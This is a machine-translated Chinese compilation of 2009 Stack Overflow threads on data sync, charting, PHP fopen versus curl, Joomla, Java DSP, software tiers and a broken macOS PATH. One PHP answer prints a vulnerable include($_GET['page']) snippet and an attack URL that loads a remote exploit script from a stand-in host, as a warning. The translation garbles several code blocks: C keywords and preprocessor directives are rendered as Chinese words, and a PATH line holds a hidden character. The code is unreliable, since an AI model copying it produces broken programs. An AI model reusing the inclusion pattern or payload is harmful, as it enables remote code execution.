条目 ID PK UserID FK ProjectID FK EntryTypeID FK Hours Date TaskName（这可以进一步规范化，尤其是如果你想要一个任务桶） 描述

我可以继续，但你明白了。

# iphone - 在两个不同的系统之间同步对象，最好的方法？

> ID：636675
> 
> 赞同：6
> 
> 时间：2009-03-11T22:50:03.927
> 
> 标签：iphone, ruby-on-rails, client-server, data-synchronization

我正在使用基于 XML 的有效负载在 iPhone 和 Web 站点之间同步两个业务对象，并且很想征求一些关于最佳例程的想法。

虽然这个问题的性质相当笼统，但我可以看到它适用于需要在 Web 实体和客户端（台式机、手机等）之间同步业务对象的各种不同系统。

双方都可以编辑、删除和更新业务对象。双方都可以在本地存储对象，但同步仅在 iPhone 端启动，以便断开连接查看。所有对象都有一个 updated_at 和 created_at 时间戳，并由双方的 RDBMS 支持（iPhone 端的 SQLite 和 Web 上的 MySQL ......我认为这再次无关紧要）并且手机确实记录了最后一次已尝试同步。否则，不会存储其他数据（目前）。

您将使用什么算法来最大程度地减少系统之间的网络干扰以进行同步？如果“软删除”不是一个选项，您将如何处理删除？您会添加哪些数据模型更改来促进这一点？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-03-11T23:01:13.383

最简单的方法：同步时，传输所有记录`where updated_at >= @last_sync_at`。不利的一面：这种方法根本不能很好地容忍时钟偏差。

保留每次更新行时递增的版本号列（这样时钟偏差不会破坏您的同步过程）和最后同步的版本号（以便可以识别潜在的冲突更改）可能更安全。为了提高带宽效率，在发送到每个复制对等方的最后一个版本的每个数据库中保留一个缓存，以便只需要传输修改的行。如果这将是星形拓扑，则叶子可以使用简化的模式，其中最后同步的版本存储在每个表中。

为了支持删除同步，需要某种形式的软删除，但是这可以是仅包含已删除行的键的“墓碑”记录的形式。只有在您确定所有副本都已处理过墓碑后，才能安全地删除它们，否则可能会出现散乱的副本恢复您认为已删除的记录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-03-31T04:36:13.953

所以我认为总的来说你的问题与断开的同步有关。

所以这就是我认为应该发生的事情：

初始同步 您检索数据和与之相关的任何信息（行版本、文件校验和等）。重要的是您存储此信息并使其保持原始状态，直到下一次成功同步。应在此数据的副本上进行更改。

跟踪更改 如果您正在处理数据库行，那么您基本上必须跟踪插入、更新和删除操作。如果您正在处理像 xml 这样的文本文件，那么它会稍微复杂一些。如果多个用户可能同时编辑此文件，那么您将必须有一个 diff 工具，以便可以在更精细的级别（而不是整个文件）检测到冲突。

检查冲突 如果您只是处理数据库行，那么冲突很容易检测到。每当更新行时，您可以有另一列递增（我认为 mssql 有这个内置函数不确定 mysql）。因此，如果您拥有的副本的编号与服务器上的编号不同，那么您就会发生冲突。对于文件或字符串，校验和将完成这项工作。我想你也可以使用修改后的日期，但要确保你有一个非常精确和准确的测量来防止错过。例如：假设我检索了一个文件，并且您在我检索到它后立即保存它。可以说时间差是 1 毫秒。然后我对文件进行更改，然后尝试保存它。如果记录的最后修改时间仅精确到 10 毫秒，我检索到的文件很有可能与您保存的文件具有相同的修改日期，因此程序认为没有冲突并覆盖您的更改。所以为了安全起见，我一般不会使用这种方法。另一方面，小修改后校验和/哈希冲突的可能性几乎为零。

解决冲突 现在这是棘手的部分。如果这是一个自动化过程，那么您必须评估情况并决定是否要覆盖更改、丢失更改或再次从服务器检索数据并尝试重做更改。幸运的是，似乎会有人际互动。但是编写代码仍然很痛苦。如果您正在处理数据库行，您可以检查每个单独的列并将其与服务器中的数据进行比较并将其呈现给用户。这个想法是以非常精细的方式向用户呈现冲突，以免压倒他们。大多数冲突在许多不同的地方都有非常小的差异，因此一次向用户呈现一个小的差异。因此，对于文本文件，它几乎相同，但要复杂一百倍。所以基本上你必须创建或使用一个差异工具（文本比较是一个完全不同的主题，这里太宽泛了），让你知道文件中的小变化以及它们在哪里以类似的方式在一个数据库：插入、删除或编辑文本的位置。然后以相同的方式将其呈现给用户。所以基本上对于每个小的冲突，用户必须选择是丢弃他们的更改，覆盖服务器中的更改还是在发送到服务器之前执行手动编辑。

所以如果你做对了，如果有冲突的话，应该给用户一个冲突列表。这些冲突应该足够细化，以便用户快速做出决定。因此，例如，冲突是拼写更改，与给用户整个段落并告诉他有更改并且他们必须决定做什么相比，用户从单词拼写中选择会更容易，然后用户将不得不寻找这个小的拼写错误。

其他注意事项： 数据验证 - 请记住，您必须在解决冲突后执行验证，因为数据可能已更改 文本比较 - 就像我说的，这是一个大主题。所以谷歌它！断开同步 - 我认为那里有几篇文章。

Source: [https://softwareengineering.stackexchange.com/questions/94634/synchronization-web-service-methodologies-or-papers](https://softwareengineering.stackexchange.com/questions/94634/synchronization-web-service-methodologies-or-papers)

# language-agnostic - 设计图表绘图软件

> ID：636676
> 
> 赞同：3
> 
> 时间：2009-03-11T22:50:15.860
> 
> 标签：language-agnostic, charts, drawing

我正在设计需要绘制几种不同类型图表的软件——条形图、饼图、流程图/图表、随时间变化的图表。我正在寻找与问题的编程方面以及 UI/显示方面相关的资源。书籍、在线资源都会有所帮助。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T22:59:41.907

它确实有点取决于语言：这里可能会给你一些建议。希望他们有所帮助：

code.google.com/apis/chart/

home.gna.org/pychart

[实用 C# 图表和图形](https://rads.stackoverflow.com/amzn/click/com/097937250X)

Excel 库可以通过 Office API 导入，但它需要您安装 Excel。

[Gnuplot](http://www.gnuplot.info/)

[图形语法](https://rads.stackoverflow.com/amzn/click/com/0387987746)：写spss绘图库的人的书。有点理论，但很好的 xml 处理......为您提供了 spss 的图形 xml 模式。

但我敢肯定，还有很多其他人会知道。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T22:54:20.203

一定要自己画吗。如果您想节省时间（可能还有钱），那么您可以尝试将其中之一嵌入到您的应用程序中[http://code.google.com/apis/chart/](http://code.google.com/apis/chart/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T23:00:51.763

与克里斯同上；如果您正在开发一种构建图表的新方法，那就太好了！

*假设：我不知道您的需求，但我最初会想到（并因此形成我的假设）您正在尝试开发更好的图表软件并且通常是界面。*

考虑检查已经使用图表的其他编程语言的库。

Adobe Flex/Air 有一个，PHP 有，Java 有，.NET 有.. 等等。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T23:09:55.220

查看现有的 charing 库以了解您选择的语言会有很大帮助。就我而言，它帮助很大，我决定不自己写。;)

对于 .net 应用程序，我们选择了[.netCharting](http://www.dotnetcharting.com/)，这非常棒。

不过，我从中学到的真正教训是：图表的种类比我想象的要多得多，而且我使用了很多图表。确保您最终获得了足够模块化的东西，以便以最小的努力处理点击新图表类型/配置。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-12T00:26:55.707

你想看看 EyeSee。

[http://moose.unibe.ch/tools/eyesee](http://moose.unibe.ch/tools/eyesee)

# php - 在 PHP 中使用 fopen($url) 和 curl 有什么重要区别？

> ID：636678
> 
> 赞同：5
> 
> 时间：2009-03-11T22:51:27.980
> 
> 标签：php, web-services, http, curl

我正在编写一些需要通过 HTTP(s) 与 Web 服务通信的代码。过去我使用过 curl 库。最近，我注意到我可以简单地使用 fopen() 来访问远程 URL，而且看起来要简单得多。

Curl 似乎更具可配置性，有很多选项。除了可配置性之外，使用哪种方法是否重要？如果是这样，哪个更好，为什么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-03-12T05:00:21.773

正如 Alnitak 所说，使用 CURL 不依赖于 PHP 设置。我做了一些速度测试

```
file_get_contents 
```

和我的

```
function file_get_contents_curl($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
} 
```

结果：

```
0.263456821442
0.0626730918884 
```

CURL 快 4 倍 :)

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-03-11T23:25:13.827

`fopen()``allow_fopen_url`如果在 中启用，则只会打开远程 URL `php.ini`。

但是在 5.2.0 之前的版本中，这是非常危险的，因为该`include`函数还会从远程站点下载**和解析**PHP 代码。一个天真的程序员很容易被以下代码发现：

```
<?php
    $page = $_GET['page'];
    include($page);
?> 
```

此时，攻击者只需要求`http://example.com/script.php?page=http://example.net/my_exploit_script`在系统上执行他们自己的代码并引入漏洞利用。不幸的是，默认值为`allow_fopen_url`'on'。

幸运的是，从 5.2.0 开始，有一个单独的设置（*应该*默认为“关闭”）被称为`allow_url_include`阻止`include`下载远程代码。

就个人而言，如果您可以选择使用 Curl，请使用它而不是`fopen`.

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-03-12T08:08:55.003

旁注：PHP 可以配置为使用 curl 作为 http url_wrapper 而不是使用“它自己的”实现。

分机/卷曲/interface.c：

```
#ifdef PHP_CURL_URL_WRAPPERS
# 如果 HAVE_CURL_VERSION_INFO
    {
        curl_version_info_data *info = curl_version_info(CURLVERSION_NOW);
        char **p = (char **)info->protocols;

        而 (*p != NULL) {
            php_register_url_stream_wrapper(*p++, &php_curl_wrapper TSRMLS_CC);
        }
    }
＃ 别的
    php_register_url_stream_wrapper("http", &php_curl_wrapper TSRMLS_CC);
    php_register_url_stream_wrapper("https", &php_curl_wrapper TSRMLS_CC);
    php_register_url_stream_wrapper("ftp", &php_curl_wrapper TSRMLS_CC);
    php_register_url_stream_wrapper("ldap", &php_curl_wrapper TSRMLS_CC);
＃ 万一
＃万一
```

# c# - 有没有办法获取列表视图中子项目的数量？

> ID：636682
> 
> 赞同：4
> 
> 时间：2009-03-11T22:52:22.453
> 
> 标签：c#, listview, interop

我正在编写一个 C# 应用程序，它需要从驻留在外部进程中的 ListView 控件中提取数据。

我已经有代码来提取数据并获取 ListView 中的项目数，但对于子项目，我需要以下等效项：

```
 public int GetListViewRowCount()
    {
        if (list_view_handle != null)
        {
            return (int)UnManagedMethods.SendMessage(list_view_handle,
                (int)UnManagedMethods.W32_LVM.LVM_GETITEMCOUNT,
                IntPtr.Zero, IntPtr.Zero);
        }
        else return 0;
    } 
```

我基本上是在寻找 LVM_GETSUBITEMCOUNT 类型消息提供的功能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-17T15:19:17.007

每次增加 iSubItem 的大小时，您都需要发送 LVM_GETITEM（到另一个进程），直到获得 FALSE。
不要忘记指向 pItem 的指针需要在其他进程中有效，因此您需要在不同进程上使用分配内存的方法。[这是我过去使用的链接。](http://www.eggheadcafe.com/software/aspnet/32112265/help-setting-a-listview.aspx)

# joomla - 在终端编辑 Joomla 文章的问题

> ID：636684
> 
> 赞同：0
> 
> 时间：2009-03-11T22:53:19.287
> 
> 标签：joomla

您如何在终端中编辑 Joomla 的文章？

**问题：**要知道 Joomla 存储文章的位置

我试图通过以下方式查找文章失败

```
locate Masi | xargs -0 grep great 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-12T00:41:47.870

文章存储在数据库中名为 的表中`jos_content`。如果您想在它们之间进行查找和替换，请打开与数据库的连接（或使用 phpMyAdmin 之类的工具）并运行以下命令：

```
 UPDATE `jos_content`
 SET    `introtext` = REPLACE(`introtext`, 'great', 'awesome'),
        `fulltext`  = REPLACE(`fulltext`, 'great', 'awesome') 
```

**编辑**以帮助您调试问题：
您将无法在代码库中找到“jos_content”，因为 Joomla 的一项功能允许您指定不同的表前缀：“jos”是默认前缀。在代码中，它总是这样写：`#__content`，并且 DBO 对象`jos_content`在幕后将其转换为 " "。

但是，您根本不需要查看代码，只需查看数据库即可。您应该能够连接到数据库 - 您需要的所有详细信息都将在您的`configuration.php`文件中。

*   如果您使用的是 Joomla 1.5，您需要的变量称为`$host`、`$user`和。 `$password``$db`
*   在 Joomla 1.0 中，变量被命名为`$mosConfig_host`、`$mosConfig_user`和`$mosConfig_password``$mosConfig_db`

您可以通过多种方式连接到数据库（如果您有可用的 phpMyAdmin，请咨询您的托管公司：它非常易于使用），但可以从终端进行（替换为上面的您自己的变量）：

```
$ mysql -h $host -u $user -p$password -D $db 
```

请注意，-p 和密码之间没有空格。从那里您应该能够运行自己的 SQL，但我**强烈**建议您在进行任何手动更改之前进行备份。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-12T00:37:38.333

Joomla 将文章存储在 MySQL 数据库中。如果您想阅读/修改/删除文章，您将不得不使用 SQL 查询。

如果您决定从终端执行此操作，则始终可以从命令行启动 mysql 客户端并从那里执行查询。

# java - Java中的信号处理库？

> ID：636686
> 
> 赞同：37
> 
> 时间：2009-03-11T22:53:41.017
> 
> 标签：java, signal-processing, numerical-analysis

我想计算时间序列的功率谱密度；做一些带通、低通和高通滤波；也许其他一些基本的东西。

是否有一个不错的开源 Java 库来执行此操作？

我搜索了一些但没有成功（例如，谷歌搜索“功率谱密度 java”或“信号处理 java”并单击链接，查看 Apache Commons、Sourceforge、java.net 等）。

有很多小程序、书籍、教程、商业产品等，不能满足我的需求。

***更新***：我发现[org.apache.commons.math.transform](http://commons.apache.org/proper/commons-math/userguide/transform.html)用于傅里叶变换。这并没有实现功率谱密度、带通等，但它是一些东西。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2009-06-07T23:05:49.227

**我的第一个建议是不要在 Java 中实现 DSP。我的第二个建议是用 Java 自己实现简单的 DSP。**

* * *

**为什么不使用 Java：**

在过去的 10 多年里，我有很多编写 DSP 代码的经验……而且几乎没有 DSP 代码是用 Java 编写的……所以当我犹豫是否要阅读有关想用 Java 实现 DSP 的人时，请原谅我。

如果您打算使用**非平凡的 DSP**，那么您不应该使用 Java。用 Java 实现 DSP 如此痛苦的原因是因为所有好的 DSP 实现都使用低级内存管理技巧、指针（大量指针）、大型原始数据数组等。

**为什么要使用Java：**

如果您正在做**简单的 DSP**工作，请使用您自己的 Java 实现。像 PSD 和过滤这样的简单 DSP 东西都相对容易实现（容易实现，但它们不会很快），因为网上有很多实现示例和有据可查的理论。

在我的例子中，我曾经在 Java 中实现了一个 PSD 函数，因为我在 Java GUI 中绘制 PSD，所以最简单的方法是在 Java 中获得性能影响，然后在 Java GUI 中计算 PSD，然后绘制它。

* * *

如何实现 PSD：

PSD 通常只是以 dB 为单位显示的 FFT 的幅度。有许多来自学术、商业和开源的示例展示了如何计算 FFT 的幅度（以 dB 为单位）。例如[，Apache 有一个 Java 实现，可以为您提供 FFT](http://commons.apache.org/proper/commons-math/userguide/transform.html)输出，然后您只需转换为幅度和 dB。FFT 之后的任何内容都应根据您的需要/想要进行定制。

* * *

如何实现低通、带通滤波：

在我看来，最简单的实现（不是计算效率最高的）是使用 FIR 滤波器并进行时域卷积。

卷积很容易实现，它是两个嵌套的 for 循环，网络上有数百万的示例代码。

如果您对滤波器设计一无所知，FIR 滤波器将是棘手的部分。最简单的方法是使用 Matlab 生成 FIR 滤波器，然后将系数复制到 java 中。我建议使用 Matlab 中的 firpmord() 和 firpm()。在阻带中实现 -30 到 -50 dB 的衰减，在通带中实现 3 dB 的纹波。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-08-25T21:33:17.517

我编写了一些 Java DSP 类的集合，例如 IIR 过滤器：

[Java DSP 集合](http://www.source-code.biz/dsp/java/)

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-03-12T02:38:46.997

我找到了[Java Digital Signal Processing](https://rads.stackoverflow.com/amzn/click/com/1558515682)一书及其[示例源代码](http://show.docjava.com/book/book.htm)。您可能会查看代码以查看它是否符合您的需求。

您还可以查看[DSP 实验室](http://sourceforge.net/projects/dsplaboratory/)。

正如评论中提到的 duffymo 和 basszero ，自 Java DSP 发布以来，Java 发生了一些变化，这可能会影响一些代码示例。特别是，（相对）新的[Concurrency Utilties 包](http://java.sun.com/j2se/1.5.0/docs/guide/concurrency/)可能被证明是有用的。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-03-11T23:04:29.977

它看起来很稀疏。尝试[Signalgo](http://vadim2000.chat.ru/soft.htm#Signalgo)或[jein](http://eamusic.dartmouth.edu/~paul/jein.php)或[Intel Signal Processing Library](http://www.intel.com/cd/software/products/asmo-na/eng/302910.htm)，尽管我认为最后一个只是 JNI 包装器。

我看到了很多你所说的小程序。我认为您可能能够为它们获取 JAR 并使用其中的类 API。但是，由于缺乏文档，可能不得不使用 eclipse 和 jad 来反编译并弄清楚它们的作用。例如，尝试[此页面](http://www.falstad.com/circuit/index.html)上的源。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-18T18:22:14.550

我找到了另一个资源，虽然它不是图书馆：[http](http://www.dickbaldwin.com/tocdsp.htm) ://www.dickbaldwin.com/tocdsp.htm 。这只是对信号处理和傅里叶变换的基本讨论，并附有一些 Java 示例。例如，请参阅教程 1478、1482、1486。不确定代码上的许可证是什么。

# javascript - 使用 Web 应用程序实现数据绑定的最佳方式是什么？

> ID：636687
> 
> 赞同：2
> 
> 时间：2009-03-11T22:53:41.297
> 
> 标签：javascript, html, data-binding

使用 jQuery 或任何其他 javascript 框架来实现数据绑定似乎并不明显。我想知道是否有人以与 WPF 数据绑定相同的方式使用 jQuery 实现数据绑定，甚至是您的标准数据绑定方案（用此资源的结果填充表格）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2011-01-13T18:41:02.283

这似乎符合要求：http: [//knockoutjs.com/](http://knockoutjs.com/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-14T18:53:08.457

作为 ASP.NET AJAX 4.0 功能的一部分，微软似乎在为 .NET 4.0 开发此功能。

在与 .NET 3.5 兼容的[codeplex](http://aspnet.codeplex.com/Release/ProjectReleases.aspx?ReleaseId=24645)上有一个社区技术预览。

看起来非常流畅和 WPF 寿命 - 允许开发人员利用有关数据绑定的所有 Silverlight/WPF 知识并将其推广到客户端 javascript 数据绑定。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-08-24T09:39:47.893

可以在[http://www.jqxb.altervista.org找到一个强大的库](http://www.jqxb.altervista.org)

# web-services - Web开发中前端、后端和中间件的区别

> ID：636689
> 
> 赞同：81
> 
> 时间：2009-03-11T22:53:49.503
> 
> 标签：web-services, architecture, frontend, backend, middleware

我想知道是否有人可以简洁地比较/对比前端、后端和中间件（“中间件”？）之间的差异。

是否存在重叠的情况？是否存在它们必须重叠并且前端/后端不能分开的情况？就瓶颈而言，哪一端与哪种类型的瓶颈相关联？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2009-03-11T23:11:05.157

这是一个细分：

前端层 -> 用户界面层通常由 HTML、Javascript、CSS、Flash 和各种服务器端代码（如 ASP.Net、经典 ASP、PHP 等）组成。认为这是最接近用户的层在代码方面。

中间件，中间层 -> 一层后面，通常称为系统的“管道”部分。Java 和 C# 是编写这部分的常用语言，可以看作是 UI 和数据之间的粘合剂，可以是 Web 服务或 WCF 组件或其他 SOA 组件。

后端层 -> 数据库和其他数据存储通常处于此级别。Oracle、MS-SQL、MySQL、SAP 和各种现成的软件都会想到这个软件，它是数据的最终处理。

这些中的任何一个之间都可能存在重叠，因为您可以将所有内容都倒入一层，例如使用生成 Javascript 的内置 AJAX 功能的 ASP.Net 网站，而后面的代码可能包含数据库命令，从而使后面的代码包含中间和后面-结束层。或者，可以使用 VBScript 来充当使用 ADO 对象的所有层，并将所有三层合并为一层。

同样，在某些情况下，可以将中间件与前端或后端结合起来。

瓶颈通常有几个不同的级别：

1) 数据库或后端处理 -> 这可能与工资单或销售或其他数据库吞吐量陷入困境的任务不同。

2) 中间件瓶颈 -> 这将是一些 Web 服务可能会达到容量但前端和后端有带宽来处理更多流量的地方。或者，可能有一些服务器是系统的一部分，它不完全是 UI 部分，或者使用 Biztalk 或 MSMQ 等可能成为瓶颈的原始数据。

3) 前端瓶颈 -> 这可能是客户端或服务器端问题。例如，如果您使用一台低端 PC 并让它加载一个包含大量下载数据的网页，那么客户端可能是瓶颈所在。同样，如果服务器受到 Amazon.com 或其他高流量网站有时可能会收到的请求的影响，它可能会排队请求。

其中一些需要解释，所以它无论如何都不是完美的，YMMV。

* * *

编辑：需要考虑的是，某些系统可以有多个前端或后端。例如，内容管理系统可能会为网站访问者提供一种查看前端内容的方法，但内容编辑者如何能够更改网站上的数据呢？提取这些数据的能力可以被视为前端，因为它是一个 UI 组件，或者它可以被视为后端，因为它由内部用户使用，而不是普通公众查看网站。因此，这里有一些要说的上下文。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-03-11T23:43:19.273

一般而言，人们将应用程序的表示层称为其*前端*，将其持久层（通常是数据库）称为*后端*，而介于两者之间的任何东西都称为*中间层*。这组思想通常被称为 3 层架构。它们使您可以将应用程序分成更易于理解（和可测试！）的块；您还可以在较高层中更轻松地重用较低层代码。

哪个代码是哪个层的一部分有点主观；平面设计师倾向于将所有非展示内容视为后端，数据库人员将数据库前面的所有内容视为前端，依此类推。

不过，并非所有应用程序都需要以这种方式分离。拥有 3 个独立的子项目肯定比打开 index.php 并开始破解要多得多。取决于 (1) 您希望维护应用程序的时间 (2) 您希望应用程序变得多复杂，您可能希望放弃复杂性。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-06-17T09:46:26.493

您的问题实际上有 3 个问题：

*   定义前端、中间和后端
*   它们如何以及何时重叠？
*   他们相关的常见瓶颈。

JB King 所描述的是正确的，但它是一个特定的、简单的版本，实际上他将前、中和后部映射到 MVC 层。他将 M 映射到后面，V 映射到前面，C 映射到中间。

对于许多人来说，这很好，因为他们来自甚至没有应用 MVC 的丑陋世界，并且您可以在视图中直接调用 DB。

然而，在真正复杂的 Web 应用程序中，您确实有两三个不同的层，称为前、中和后。它们中的每一个都可能有一个关联的数据库和一个控制器。

最终用户可以看到前端。它不应该与前台混淆，前台是前台参数和管理的 UI。前端通常是某种 CMS 或电子商务平台（Magento 等）

中端不是强制性的，是业务逻辑所在。它将基于 PIM、MDM 工具或某种自定义数据库，您可以在其中丰富您的产品或文章（用于 CMS）。它也是您编写需要在不同前端（例如 PC 前端和基于 API 的移动应用程序之间）之间共享的业务功能的地方。有时，ESB 或 ActiveMQ 之类的工具将成为您的中端

后端将是第 3 层，围绕您的源数据库或 ERP。它可能只是 API 写入和读取您的 ERP。如果您从事电子商务，它可能是您的供应商数据库。事实上，它确实依赖于 web 项目，但它始终是一个中央存储库。可以通过 DB 调用、API、Hibernate 层或全功能后端应用程序访问它

此描述意味着在此线程中无法回答其他 2 个问题，因为瓶颈实际上取决于您的 3 个末端包含的内容：JB King 所写的内容对于简单的 MVC 架构仍然适用

在提出这个问题的时候（5 年前），也许 MVC 模式还没有被广泛采用。现在，绝对没有理由不遵循 MVC 模式并且视图将与 DB 调用相关联。如果您阅读“是否存在必须重叠且前端/后端无法分离的情况？”的问题？在更广泛的意义上，有 3 个不同的组件，那么有时 3 层架构当然是无用的。想想一个简单的个人博客，您不需要提取外部数据或轮询 RabbitMQ 队列。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-06-13T13:36:39.403

这是一个显示前端/中间/后端的真实示例。

## 一般说明：

*   前端负责向用户呈现数据。请注意有趣的怪癖，您可能有两个不同的前端与单个后端相关联
*   后端提供业务逻辑/数据持久性。
*   中间件（图中的activemq）负责系统到系统。后端之间的集成。通常它作为单独的应用程序安装 [![在此处输入图像描述](https://i.stack.imgur.com/BI8is.jpg)](https://i.stack.imgur.com/BI8is.jpg)

## 重叠：

前端和后端之间可能存在重叠。这通常会导致应用程序维护和可扩展性方面的长期问题。在遗留应用程序中相当常见。

大多数现代技术堆栈都鼓励开发人员进行严格的分离。例如在图片中你可以看到第一个系统的后端有REST Web服务，这是一条清晰的分隔线。

## 瓶颈

大多数瓶颈是由数据库/网络引起的。数据库位于后端。至于网络问题，每个连接都通过网络，因此每个连接都有可能变慢。通过良好的应用程序设计，这些问题在很大程度上是可以避免的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T23:56:45.623

在网络和安全方面，Backend 是迄今为止（应该是）最安全的节点。

中间端部分，通常是一个网络服务器，在某种程度上与公司的网络隔绝，并且在许多方面都被切断了。中端节点通常放置在 DMZ 中，并通过防火墙设置与网络隔离。大部分网页的服务器端代码解析都是在中端Web服务器上处理的。

到达后端意味着通过中间端，它有一套精心设计的规则，允许/禁止访问存储在数据库（后端）服务器上的重要数字。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-09-22T00:57:04.097

前端是指客户端，而后端是指应用程序的服务器端。两者都对 Web 开发至关重要，但它们的角色、职责和工作环境完全不同。前端基本上是用户所看到的，而后端是一切工作的方式

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-07-14T12:10:23.733

前端 -> 这些是网站的客户端，用户可以通过用户界面与服务器交互。通常使用 Html 和 CSS 构建。

中间件 -> 中间件是负责系统通信和管理数据的软件或服务。它处理组件和输入/输出之间的通信

后端 -> 后端是任何应用程序的服务器端，由对数据执行的所有功能和操作组成。这部分被认为是任何应用程序中最重要的部分。只有服务器管理员可以访问它。它主要由数据库和服务器组成。

# php - 链接多数据库信息

> ID：636691
> 
> 赞同：2
> 
> 时间：2009-03-11T22:54:17.520
> 
> 标签：php, mysql, database, database-connection

您将分布在多个数据库架构（想想 MySQL 与 PostgreSQL 等）上的数据链接到单个应用程序中的方法是什么？

你会创建巨大的哈希表/数组来匹配内容吗？是否有其他更有效且内存消耗更少的选项来执行此操作？

如果您要同时使用来自 MySQL 和 PostgreSQL 源的数据，而无法将一个 DB 转换为另一个（应用程序限制、时间不足、知识不足……），您将如何处理？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-27T03:51:14.257

SQL 中继或其他 sql 代理。 [http://sqlrelay.sourceforge.net/](http://sqlrelay.sourceforge.net/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T23:03:47.530

至少在 MySQL 的情况下，您可以在单个查询中使用来自多个数据库的数据，前提是这些数据库由同一个 MySQL 服务器实例托管。您可以通过使用模式名称限定表来区分不同数据库中的表：

```
CREATE TABLE test.foo (id SERIAL PRIMARY KEY) TYPE=InnoDB;

CREATE DATABASE test2;
CREATE TABLE test2.bar (foo_id BIGINT UNSIGNED, 
    FOREIGN KEY (foo_id) REFERENCES test.foo(id)) TYPE=InnoDB;

SELECT * FROM test.foo f JOIN test2.bar b ON (f.id = b.foo_id); 
```

在 PostgreSQL 中，您还可以使用模式名称限定表引用。不过，我不确定您是否可以跨数据库创建外键约束。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-09-16T04:23:47.773

如果您希望在 RDBMS 之间创建约束 - 您不能。

我面临着同样的问题，即在 PostgreSQL 之外运行应用程序的一部分以从中受益，而在 MySQL 的其余部分则更好。

我正在执行多个插入键控相同格式的主要信息（在我的情况下是通用用户 ID），因此我让应用程序处理确保从两个数据库请求相同 ID 的逻辑。

但是，我发现除了将其抽象为类或实用程序函数之外，并没有真正干净的方法来做到这一点。

# macos - 在 Mac OSX 10.5 中，找不到我的终端命令 sudo、find 等

> ID：636693
> 
> 赞同：3
> 
> 时间：2009-03-11T22:54:29.640
> 
> 标签：macos, path, terminal, find, sudo

我不知道发生了什么，但是在 Mac OSX 10.5 上的终端中，它再也找不到我的 sudo 命令或 find 命令等。它们在那里是因为如果我放 /usr/bin/sudo 或 /usr/bin /发现它工作正常...

我的 .bash_login 文件如下所示： export PATH="/usr/local/bin:/usr/local/sbin:/usr/local/mysql/bin:/usr/bin$PATH"

我的 .bash_profile 文件如下所示： export PATH="/Library/Frameworks/Python.framework/Versions/Current/bin:/Library/Python/2.5/site-packages/django_trunk/django/bin:/usr/local/mysql /bin:/usr/bin/sudo$PATH"

我现在要说，我真的不*知道*我在用终端做什么。我只是这一切的初学者，我必须为环境变量（就是它们的名字吗？）做一些事情才能丢失。我想我只需要确保 /usr/bin/ 路径在我的 bash 文件中，但它们是，而且它似乎不起作用。请帮忙！

此外，当我使用 /usr/bin/find 命令时，它对我说“权限被拒绝”，即使我以系统管理员帐户登录 Mac OSX。我不明白。

任何帮助都会很重要。谢谢 - 詹姆斯

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-11T22:58:51.410

看起来您的两个 PATH 导出格式都不正确：

```
export PATH="/usr/local/bin:/usr/local/sbin:/usr/local/mysql/bin:/usr/bin$PATH" 
```

那里的最后一点不起作用。它应该是：

```
export PATH=/usr/local/bin:/usr/local/sbin:/usr/local/mysql/bin:/usr/bin:$PATH 
```

注意到'$PATH' 之前的冒号了吗？这一点很重要 ;）

此外，双引号不是必需的。

如果这不起作用，我们将需要更多信息。即使在您的 shell 配置被加载后，其他东西也可能正在修改您的路径。

你可以发布结果：

```
$ echo $PATH 
```

配置文件并不总是能很好地指示当前环境变量，因为它们会被整个系统中的许多程序和文件修改。要查看所有环境变量，您可以运行：

```
$ env 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-07-13T13:05:43.800

这应该可以完全永久地解决问题。

首先，在终端中使用以下命令导出环境路径。

```
export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/b‌​in 
```

现在你有了你想要的命令。（例如 try `ls`。您会看到该命令正在运行）。但这仅适用于当前会话。如果您关闭终端并打开一个新终端，您将遇到上一个问题。要使此更改永久生效，请使用以下命令，

转到主目录

```
cd ~ 
```

在 nano / vim 中打开 .bash_profile 文件（我在这里使用 nano）

```
nano .bash_profile 
```

这将打开纳米编辑器。在新行中，粘贴以下内容；

```
export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/bin:$PATH 
```

按'control'+'o'保存（WriteOut）和'control'+'x'退出nano。

全部做完 ！现在尝试命令。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-04-27T05:23:27.457

